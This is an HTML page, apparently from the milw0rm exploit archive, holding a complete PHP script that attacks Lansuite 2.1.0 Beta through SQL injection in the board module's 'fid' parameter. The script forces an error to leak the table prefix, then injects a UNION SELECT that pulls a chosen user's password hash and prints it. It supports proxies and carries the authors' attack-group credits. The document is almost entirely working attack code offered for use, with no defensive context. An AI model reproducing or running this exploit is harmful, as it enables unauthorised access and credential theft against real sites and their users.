<html>
<head>
<title>Lansuite <= 2.1.0 Beta (fid) Remote SQL Injection Exploit</title>
</head>
<pre>
&lt;?
error_reporting(E_ERROR);

function xss_init()
{
    if (!extension_loaded('php_curl'))
    {
       if (!dl('curl.so') and !dl('php_curl.so') and !dl('php_curl.dll'))
       die (&quot;oo error - cannot load curl extension!&quot;);
    }
}

function xss_header()
{
    echo &quot;\noooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;
    echo &quot;                                  oo    ooooooo     ooooooo\n&quot;;
    echo &quot;                    oooo   oooo o888  o88     888 o888   888o\n&quot;;
    echo &quot;                      888o888    888        o888   888888888\n&quot;;
    echo &quot;                      o88888o    888     o888   o 888o   o888\n&quot;;
    echo &quot;                    o88o   o88o o888o o8888oooo88   88ooo88\n&quot;;
    echo &quot;oooooooooooooooooooooo lansuite 2.10 remote sql injection oooooooooooooooooooooo\n&quot;;
    echo &quot;oo usage          $ php lansuite-210-exploit.php [url] [user id]\n&quot;;
    echo &quot;oo proxy support  $ php lansuite-210-exploit.php [url] [user id] [proxy]:[port]\n&quot;;
    echo &quot;oo example        $ php lansuite-210-exploit.php http://localhost 1\n&quot;;
    echo &quot;oo print the password of the user\n\n&quot;;
}

function xss_bottom()
{
    echo &quot;\noo developed for the [myg0t] online gaming group\n&quot;;
    echo &quot;oo discover : x128 - alexander wilhelm - 24/02/2006\n&quot;;
    echo &quot;oo contact  : exploit &lt;at&gt; x128.net                    oo website : www.x128.net&quot;;
}

function xss_exploit()
{
    $xss_target = $_SERVER['argv'][1] . &quot;/index.php&quot;;
    $xss_http_prefix_get = &quot;?mod=board&amp;action=forum&amp;fid=x128&quot;;

    $xss_connection = curl_init();

    if ($_SERVER['argv'][3])
    {
        curl_setopt($xss_connection, CURLOPT_TIMEOUT, 8);
        curl_setopt($xss_connection, CURLOPT_PROXY, $_SERVER['argv'][3]);
    }

    curl_setopt ($xss_connection, CURLOPT_URL, $xss_target . $xss_http_prefix_get);
    curl_setopt ($xss_connection, CURLOPT_HEADER, 0);
    curl_setopt ($xss_connection, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt ($xss_connection, CURLOPT_USERAGENT, 'x128');

    $xss_prefix_source = curl_exec($xss_connection) or die(&quot;oo error - cannot connect!\n&quot;);
    
    $xss_prefix = substr(strstr($xss_prefix_source, &quot;need_type FROM &quot;), 15, strpos(strstr($xss_prefix_source, &quot;need_type FROM &quot;), &quot;board_forums&quot;) - 15);
    
    $xss_http_get = &quot;?mod=board&amp;action=forum&amp;fid=&quot; . urlencode(&quot;0 UNION SELECT 1, 1, 1, 1, 1, 1, password, 1, 1, 1, 1 FROM &quot;. $xss_prefix .&quot;user WHERE userid = &quot;. $_SERVER['argv'][2] .&quot;/*&quot;);

    curl_setopt ($xss_connection, CURLOPT_URL, $xss_target . $xss_http_get);

    $xss_source = curl_exec($xss_connection) or die(&quot;oo error - cannot connect!\n&quot;);

    $xss_passwd = substr(strstr($xss_source, &quot;b.userid WHERE pid = &quot;), 21, 32);
    
    if ($xss_passwd == &quot;&quot;) { $xss_passwd = substr(strstr($xss_source, &quot;Unknown column '&quot;), 16, 32); }

    if ($_SERVER['argv'][2] &amp;&amp; $xss_passwd)
    {
        echo &quot;oo user           &quot; . $_SERVER['argv'][2] . &quot;\n&quot;;
        echo &quot;oo password       &quot; . $xss_passwd . &quot;\n\n&quot;;
        echo &quot;oo dafaced ...\n&quot;;
    }
    curl_close ($xss_connection); 
}

xss_init();
xss_header();
xss_exploit();
xss_bottom();
?&gt;

# milw0rm.com [2006-02-24]
</pre>
</html>

